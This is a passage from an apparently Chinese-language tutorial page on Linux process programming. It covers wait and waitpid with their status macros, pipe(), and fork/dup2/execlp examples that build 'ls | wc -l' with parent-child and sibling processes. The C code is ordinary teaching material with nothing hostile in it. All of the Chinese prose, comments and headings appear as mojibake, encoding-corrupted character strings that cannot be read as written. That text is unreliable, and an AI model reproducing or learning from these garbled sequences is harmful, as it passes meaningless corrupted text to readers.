¸åœ¨å…¶ä¸­ä¿ç•™äº†ä¸€äº›ä¿¡æ¯ï¼Œå¦‚æœæ˜¯æ­£å¸¸ç»ˆæ­¢åˆ™ä¿å­˜ç€é€€å‡ºçŠ¶æ€ï¼Œå¦‚æœæ˜¯å¼‚å¸¸ç»ˆæ­¢åˆ™ä¿ç•™ç€å¯¼è‡´è¯¥è¿›ç¨‹ç»ˆæ­¢çš„ä¿¡å·æ˜¯å“ªä¸ªï¼Œè¿™ä¸ªè¿›ç¨‹çš„çˆ¶è¿›ç¨‹å¯ä»¥è°ƒç”¨waitæˆ–waitpidè·å–è¿™äº›ä¿¡æ¯ï¼Œç„¶åå½»åº•æ¸…é™¤æ‰è¿™ä¸ªè¿›ç¨‹ã€‚</p><p>çˆ¶è¿›ç¨‹è°ƒç”¨waitå‡½æ•°å¯ä»¥å›æ”¶å­è¿›ç¨‹ç»ˆæ­¢ä¿¡æ¯ï¼Œè¯¥å‡½æ•°æœ‰ä¸‰ä¸ªåŠŸèƒ½</p><ul><li>é˜»å¡ç­‰å¾…å­è¿›ç¨‹é€€å‡º</li><li>å›æ”¶å­è¿›ç¨‹æ®‹ç•™èµ„æº</li><li>è·å–å­è¿›ç¨‹ç»“æŸçŠ¶æ€</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pid_t wait(int *status)</span><br><span class="line">æˆåŠŸï¼šæ¸…ç†æ‰çš„å­è¿›ç¨‹ID</span><br><span class="line">å¤±è´¥ï¼š-1ï¼ˆæ²¡æœ‰å­è¿›ç¨‹ï¼‰</span><br></pre></td></tr></table></figure><p>å¯ä½¿ç”¨waitå‡½æ•°ä¼ å‡ºå‚æ•°statusæ¥ä¿å­˜è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ã€‚å€ŸåŠ©å®å‡½æ•°æ¥è¿›ä¸€æ­¥åˆ¤æ–­è¿›ç¨‹ç»ˆæ­¢çš„å…·ä½“åŸå› ï¼Œå®å‡½æ•°å¯åˆ†ä¸ºå¦‚ä¸‹ä¸‰ç»„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WIFEXITED(status) ä¸ºé<span class="number">0</span> è¿›ç¨‹æ­£å¸¸ç»“æŸ</span><br><span class="line">WEXITSTATUS(status) å¦‚ä¸Šå®ä¸ºçœŸï¼Œä½¿ç”¨æ­¤å® è·å–è¿›ç¨‹é€€å‡ºçŠ¶æ€(<span class="built_in">exit</span>çš„å‚æ•°)</span><br><span class="line">  </span><br><span class="line">WIFSIGNALED(status) ä¸ºé<span class="number">0</span> è¿›ç¨‹å¼‚å¸¸ç»ˆæ­¢</span><br><span class="line">WTERMSIG(status)å¦‚ä¸Šå®ä¸ºçœŸï¼Œä½¿ç”¨æ­¤å® å–å¾—ä½¿è¿›ç¨‹ç»ˆæ­¢çš„é‚£ä¸ªä¿¡å·çš„ç¼–å·</span><br><span class="line">  </span><br><span class="line">WIFSTOPPED(status) ä¸ºé<span class="number">0</span> è¿›ç¨‹å¤„äºæš‚åœçŠ¶æ€</span><br><span class="line">WSTOPSIG(status) å¦‚ä¸Šå®ä¸ºçœŸï¼Œä½¿ç”¨æ­¤å® å–å¾—ä½¿è¿›ç¨‹æš‚åœçš„é‚£ä¸ªä¿¡å·çš„ç¼–å·</span><br><span class="line">WIFCONTINUED(status) ä¸ºçœŸ è¿›ç¨‹æš‚åœåå·²ç»ç»§ç»­è¿è¡Œ</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹ä»£ç å¯ä»¥åˆ¤æ–­å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ï¼Œå¹¶è·å–ç›¸åº”çš„çŠ¶æ€ä¿¡å·ç¼–å·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child,my myid=%d,going to sleep 10s\n"</span>,getpid());</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"------------child die------------------\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">73</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid&gt;<span class="number">0</span>) &#123;</span><br><span class="line">wpid = wait(&amp;status);</span><br><span class="line"><span class="keyword">if</span> (wpid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"wait error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child exit with %d\n"</span>,WEXITSTATUS(status));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(WIFSIGNALED(status))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child kill with signal %d\n"</span>,WTERMSIG(status));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--------parent wait finish:%d\n"</span>,wpid);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">perror(<span class="string">"fork"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="waitpidå‡½æ•°"><a href="#waitpidå‡½æ•°" class="headerlink" title="waitpidå‡½æ•°"></a>waitpidå‡½æ•°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *status,<span class="keyword">int</span> options)</span></span></span><br><span class="line">å‚æ•°:</span><br><span class="line">  pid:æŒ‡å®šå›æ”¶çš„å­è¿›ç¨‹pid</span><br><span class="line">    &gt; <span class="number">0</span>:å¾…å›æ”¶çš„å­è¿›ç¨‹pid</span><br><span class="line">     <span class="number">-1</span>:ä»»æ„å­è¿›ç¨‹</span><br><span class="line">      <span class="number">0</span>:åŒç»„çš„å­è¿›ç¨‹</span><br><span class="line">  status:(ä¼ å‡º)å›æ”¶è¿›ç¨‹çš„çŠ¶æ€</span><br><span class="line">  options:WNOHANG æŒ‡å®šå›æ”¶æ–¹å¼ä¸ºï¼Œéé˜»å¡</span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">  &gt; <span class="number">0</span>:è¡¨æˆåŠŸå›æ”¶çš„å­è¿›ç¨‹pid</span><br><span class="line">    <span class="number">0</span>:å‡½æ•°è°ƒç”¨æ—¶ï¼Œå‚æ•°<span class="number">3</span>æŒ‡å®šäº†WNOHANGï¼Œå¹¶ä¸”æ²¡æœ‰å­è¿›ç¨‹ç»“æŸ</span><br><span class="line">   <span class="number">-1</span>:å¤±è´¥ã€‚errno</span><br></pre></td></tr></table></figure><p>æŒ‡å®šæŸä¸€ä¸ªè¿›ç¨‹è¿›è¡Œå›æ”¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid,tmpid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">2</span>) &#123;</span><br><span class="line">tmpid = pid;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"---------pid = %d\n"</span>,tmpid);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="comment">//sleep(5); //é…åˆWNOHANG ä¸é˜»å¡</span></span><br><span class="line"><span class="comment">//wpid = waitpid(tmpid,NULL,WNOHANG);//æŒ‡å®šä¸€ä¸ªè¿›ç¨‹å›æ”¶ï¼Œä¸é˜»å¡</span></span><br><span class="line">wpid = waitpid(tmpid,<span class="literal">NULL</span>,<span class="number">0</span>); <span class="comment">//æŒ‡å®šä¸€ä¸ªè¿›ç¨‹å›æ”¶ï¼Œé˜»å¡å›æ”¶</span></span><br><span class="line"><span class="keyword">if</span>(wpid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"waitpid error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent,wait a child finish : %d \n"</span>,wpid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child,pid=%d\n"</span>,i+<span class="number">1</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‡å®šå›æ”¶æ‰€æœ‰è¿›ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid,tmpid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>((wpid=waitpid(<span class="number">-1</span>,<span class="literal">NULL</span>,WNOHANG))!=<span class="number">-1</span>)&#123; <span class="comment">//ä½¿ç”¨éé˜»å¡æ–¹å¼å›æ”¶</span></span><br><span class="line"><span class="keyword">if</span>(wpid &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wait child %d\n"</span>,wpid);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(wpid == <span class="number">0</span>)&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child,pid=%d\n"</span>,i+<span class="number">1</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h4><p>å†…æ ¸å€ŸåŠ©ç¯å½¢é˜Ÿåˆ—æœºåˆ¶ï¼Œä½¿ç”¨å†…æ ¸ç¼“å†²åŒºå®ç°</p><h5 id="pipeå‡½æ•°"><a href="#pipeå‡½æ•°" class="headerlink" title="pipeå‡½æ•°"></a>pipeå‡½æ•°</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int pipe(int fd[2])</span><br><span class="line"></span><br><span class="line">å‚æ•°ï¼šfd[0]:è¯»ç«¯</span><br><span class="line">     fd[1]:å†™ç«¯</span><br><span class="line">è¿”å›å€¼ï¼šæˆåŠŸ 0</span><br><span class="line">      å¤±è´¥ -1 error</span><br></pre></td></tr></table></figure><h5 id="pipeå‡½æ•°å®ç°çˆ¶è¿›ç¨‹å†™ï¼Œå­è¿›ç¨‹è¯»çš„åŠŸèƒ½"><a href="#pipeå‡½æ•°å®ç°çˆ¶è¿›ç¨‹å†™ï¼Œå­è¿›ç¨‹è¯»çš„åŠŸèƒ½" class="headerlink" title="pipeå‡½æ•°å®ç°çˆ¶è¿›ç¨‹å†™ï¼Œå­è¿›ç¨‹è¯»çš„åŠŸèƒ½"></a>pipeå‡½æ•°å®ç°çˆ¶è¿›ç¨‹å†™ï¼Œå­è¿›ç¨‹è¯»çš„åŠŸèƒ½</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">char</span> *str = <span class="string">"hello pipe\n"</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">    sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">write(fd[<span class="number">1</span>],str,<span class="built_in">strlen</span>(str));</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line">ret = read(fd[<span class="number">0</span>],buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="çˆ¶å­è¿›ç¨‹å®ç°ls-wc-l"><a href="#çˆ¶å­è¿›ç¨‹å®ç°ls-wc-l" class="headerlink" title="çˆ¶å­è¿›ç¨‹å®ç°ls | wc -l"></a>çˆ¶å­è¿›ç¨‹å®ç°ls | wc -l</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid==<span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"fork error"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">dup2(fd[<span class="number">1</span>],STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">dup2(fd[<span class="number">0</span>],STDIN_FILENO);</span><br><span class="line">execlp(<span class="string">"wc"</span>,<span class="string">"wc"</span>,<span class="string">"-l"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å…„å¼Ÿè¿›ç¨‹å®ç°ls-wc-l"><a href="#å…„å¼Ÿè¿›ç¨‹å®ç°ls-wc-l" class="headerlink" title="å…„å¼Ÿè¿›ç¨‹å®ç°ls | wc -l"></a>å…„å¼Ÿè¿›ç¨‹å®ç°ls | wc -l</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> ret,i;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">2</span>)&#123;</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span 